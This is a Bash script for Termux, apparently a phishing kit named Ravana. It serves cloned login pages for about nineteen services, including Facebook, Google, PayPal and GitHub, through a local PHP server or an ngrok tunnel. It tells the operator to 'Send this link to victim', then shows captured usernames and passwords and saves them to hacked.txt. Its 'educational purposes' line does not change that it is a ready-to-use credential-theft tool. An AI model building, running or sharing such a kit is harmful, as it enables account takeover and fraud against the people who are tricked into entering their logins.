#!/data/data/com.termux/files/usr/bin/bash
#@Author prince kumar
#Date 23 dec 2020
# Version V1.0
#This is made only for educational purposes...
# Satrt coding here
# Define some color coding here
r="\e[31;1m" # this is for red
g="\e[32;1m" # green
y="\e[33;1m" # yellow
b="\e[34;1m" # blue
p="\e[35;1m" #purple
n="\e[36;1m" # i don't know this color name
w="\e[0;1m" # This is for white...
#End of color definening-------------------------------
#Trap singnals -------------------------------------
trap user_intrupt SIGINT
trap user_intrupt SIGTSTP

# make a function to catch signals...
#Lets check for any update -----
repoUpdate(){
	
	git pull https://github.com/princekrvert/Ravana.git > /dev/null 2>&1 & echo -e "${g}[⏰${g}] ${b} Checking for update ...."
	clear
}
repoUpdate #Update the repo
user_intrupt(){
	printf " \n ${w}\n"
	printf " ${r}[${w}!${r}]---->>${p} Exiting Ravana2.0"
	printf " \n"
	sleep 1
	exit 1
}
#Make a function to check for user data--------
check_cred(){
	while true;do
		if [[ -f .pweb/$1/userlog.txt ]];then
			echo -e "${g}[${w}+${g}] ${y} User data found ${w}"
			echo " "
			cat .pweb/$1/userlog.txt
			echo -e "\n"
			cp .pweb/$1/userlog.txt hacked.txt
			rm -rf .pweb/$1/userlog.txt
			echo -e "${w}[${r}+${w}] ${y} Saving data into hacked.txt"
			echo " "
		fi
	done
}
#End of user cred-------------------
#Make a server for handle ngrok request
s_ngrok(){
	echo -e " "
	if [[ -e ngrok ]];then
		echo -e "${r}[${w}+${r}] ${g} Turn on your hotspot "
		chmod +x ngrok

	else
		echo -e "${r}[${w}+${r}] ${g} Downloding ngrok "
		#wget https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
		#unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
	fi
	ran=$((RANDOM % 10))
	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
	./ngrok http 127.0.0.1:800$ran > /dev/null 2>&1 & sleep 8
	n_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e "${y}[${w}+${y}]${r} Send this link to victim"
	echo -e " "
	echo -e "${r}[${w}+${r}] ${p} Ngrok link:${w} $n_link"
	#Now call the check cred----------
	check_cred $1


}
#End of ngrok function------


#Make a localhost server-----------------------------
s_localhost(){
	#start localhost
	echo -e "\n"
	echo -e "${g}[${r}~${g}] ${w} Port selection "
	echo -e "\n"
	ran=$((RANDOM % 10))
	echo -e "${p}[${w}01${p}] ${r} Random"
	echo -e "${p}[${w}02${p}] ${r} Custom  "
	echo -e "\n"
	echo -ne "${g}[${r}~${g}] ${w} Choose option: "
	read lp_optn
	if [[ $lp_optn -eq 1 ]] || [[ $lp_optn -eq 01 ]];then
		echo -e "\n"
		php -S 127.0.0.1:887$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 5 
		echo -e "\n"
		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:887$ran"
		#now check for user crenditial------
		check_cred $1
	elif [[ $lp_optn -eq 2 ]] || [[ $lp_optn -eq 02 ]];then
		echo -ne "${p}[${w}-${p}] ${r} Enter a port number: "
		read p_num #reading for port number
		php -S 127.0.0.1:$p_num -t .pweb/$1 > /dev/null 2>&1 & sleep 2
		echo -e "\n"
		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:$p_num "
		check_cred $1
	else
		echo -e "\n"
		echo -e "${r}[${y}!${r}] ${p} Invalid option"
	fi
}
#Make a function to handle ----------------------------
server(){
	cp -R server/$1 .pweb
	echo -e "\n"
	echo -e "${g}[${y}+${g}] ${w} Port forwoding "
	echo -e "\n"
	echo -e "${p}[${w}01${p}] ${r} Localhost "
	echo -e "${p}[${w}02${p}] ${r} Ngrok "
	echo -e "\n"
	echo -ne "${y}[${w}~${y}] ${p} Choose an option: "
	read p_optn
	if [[ $p_optn -eq 1 ]] || [[ $p_optn -eq 01 ]];then
		echo -e "\n"
		echo -e "${w}[${r}+${w}] ${g} Starting localhost "
		s_localhost $1 
	elif [[ $p_optn -eq 2 ]] || [[ $p_optn -eq 02 ]];then
		echo -e "\n"
		echo -e "${w}[${r}+${w}] ${g} Starting Ngrok "
		s_ngrok $1
	else 
		echo -e "\n"
		echo -e "${r} Invalid option."
	fi

#Nedd to start localhost and Ngrok server..

}
#Make a function for Author information --------------
about_me(){
	echo " "
	echo -e "${g}[${w}+${g}] ${y} I am prince kumar amd i am a junior mechanical engineer.\n"
	echo -e "${g}[${w}+${g}] ${p} Youtube https://m.youtube.com/c/Princeweb\n"
	echo -e "${g}[${w}+${g}] ${y} Instagram https://instagram.com/sirprincekrvert\n"
	echo -e "${g}[${w}+${g}] ${r} Facebook https://m.facebook.com/Princekrvert"

}





# Make a function for checking for requirements...---
req_m(){
	printf "${r}_______ ${p} checking for requirements ${r}_______\n"
	which php 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing php${g}+++++" ; apt-get install php -y; }
	which curl 2>&1 > /dev/null || { echo -e  "${g}+++++${y}Installing curl${g}+++++" ; apt-get install curl -y ; }
        which unzip 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing unzip${g}+++++" ; apt-get install unzip -y ;}
	which wget 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing wget${g}+++++" ; apt-get install wget -y ; }
 }
# calling req function
req_m
# make a typewriter for ravana2.0
type_W(){
	text=( 'S' 't' 'a' 'r' 't' 'i' 'n' 'g' ' ' 'R' 'a' 'v' 'a' 'n' 'a' )
	for i in "${text[@]}";do
		printf " ${r} ${i}"
		sleep .3
	done
}
#call the typewriter
type_W
trap user_intrupt 
#Make a banner for Ravana2.0
banner(){
	clear
	
	printf "\n ${g}"
	printf "

   ██████   █████  ██    ██  █████  ███    ██  █████ 
   ██   ██ ██   ██ ██    ██ ██   ██ ████   ██ ██   ██ 
   ██████  ███████ ██    ██ ███████ ██ ██  ██ ███████ 
   ██   ██ ██   ██  ██  ██  ██   ██ ██  ██ ██ ██   ██ 
   ██   ██ ██   ██   ████   ██   ██ ██   ████ ██   ██
                      ::${y}V_2.3         
	        \e[40;1m made by Prince kumar\e[0;1m                                                 

"
}
#Call banner ------------
banner
#Check for the hidden folders..
hidden(){
	if [ -d .pweb ];then
		rm -rf .pweb
		mkdir .pweb
		echo " "
	else
		mkdir .pweb
	fi
}
#Cheacking for folder---------------------
hidden
#display options for websites...

printf "${p}[${g}01${p}]${w} Facebook     ${p}[${g}11${p}]${w} Netflix\n"
printf "${p}[${g}02${p}]${w} Instagram    ${p}[${g}12${p}]${w} Twitter\n"
printf "${p}[${g}03${p}]${w} Snapchat     ${p}[${g}13${p}]${w} Dropbox\n"
printf "${p}[${g}04${p}]${w} Google       ${p}[${g}14${p}]${w} ig follower\n"
printf "${p}[${g}05${p}]${w} Github       ${p}[${g}15${p}]${w} Yandex\n"
printf "${p}[${g}06${p}]${w} Paypal       ${p}[${g}16${p}]${w} Origin\n"
printf "${p}[${g}07${p}]${w} Spotify      ${p}[${g}17${p}]${w} Ebay\n"
printf "${p}[${g}08${p}]${w} Microsoft    ${p}[${g}18${p}]${w} Pinterest\n"
printf "${p}[${g}09${p}]${w} Linkedin     ${p}[${g}19${p}]${w} Yahoo\n"
printf "${p}[${g}10${p}]${w} Adobe        ${p}[${g}20${p}]${w} About me\n"
echo " "
echo -ne "${y}[${p}~${y}] ${r}Choose an options:: "
read optn #Reading for user choise..
#Apply a case statement
case $optn in
	01 | 1)
		echo " " 
		echo -ne "${w}[${g}+${w}] ${y} Starting facebook server"
		server facebook ;;
	2 | 02)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting instagram server"
		server instagram ;;
	3 | 03)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting Snapchat server"
		server snapchat;;
	4 | 04)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting google server"
		server google;;

	5 | 05)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting github server"
		server github;;

	6 | 06)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting Paypal server"
		server paypal;;

	7 | 07)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting Spotify server"
		server spotify;;

	8 | 08)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting microsoft server"
		server microsoft;;

	9 | 09)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting linkedin server"
		server linkedin;;

	10)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting adobe server"
		server adobe;;

	11)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting netflix server"
		server netflix;;

	12)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting twitter server"
		server twitter;;

	13)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting dropbox server"
		server dropbox;;

	14)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting fake instagram follower server"
		server ig_follower;;
	15)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting yandex server"
		server yandex;;
	16)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting origin server"
		server origin;;
	17)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting ebay server"
		server ebay;;
	18)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting pinterest server"
		server pinterest;;
	19)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Starting yahoo server"
		server yahoo;;
	20)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y}  Please wait"
		about_me;;
	*)
		echo " "
                echo -ne "${w}[${r}!${w}] ${y} Invalid option";;
		

esac


